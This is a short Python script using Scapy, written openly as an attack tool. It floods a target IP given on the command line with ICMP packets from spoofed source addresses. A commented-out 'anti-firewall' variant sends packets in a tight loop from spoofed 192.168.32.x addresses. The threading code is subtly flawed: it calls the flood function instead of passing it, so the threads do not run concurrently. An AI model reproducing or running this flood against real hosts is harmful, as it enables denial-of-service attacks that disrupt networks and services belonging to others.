#Random IP Version()

import sys
from scapy.all import *
from struct import pack

target = str(sys.argv[1])
num_packets = int(sys.argv[2])

print("Attacking " + target + " with ICMP flood with " + str(num_packets) + " packets")

def icmp_flood():
    for i in range (num_packets):
        packet = IP(src = RandIP(), dst = target)/ICMP()/"random_payload"
        send(packet)

t1 = threading.Thread(target=icmp_flood())
t2 = threading.Thread(target=icmp_flood())
t3 = threading.Thread(target=icmp_flood())
t4 = threading.Thread(target=icmp_flood())

t1.start()
t2.start()
t3.start()
t4.start()


"""
#Anti-firewall Version
import sys
from scapy.all import *
from struct import pack

target = str(sys.argv[1])

print("Attacking " + target + " with ICMP flood. Generating 1.000x4 packets per second...")

def icmp_flood():
    packet = IP(src = "192.168.32." + str(random.randint(2, 253)), dst = target) / ICMP() / "random_payload"
    send(packet, loop = 1, inter=0.000001)

t1 = threading.Thread(target=icmp_flood())
t2 = threading.Thread(target=icmp_flood())
t3 = threading.Thread(target=icmp_flood())
t4 = threading.Thread(target=icmp_flood())

t1.start()
t2.start()
t3.start()
t4.start()
"""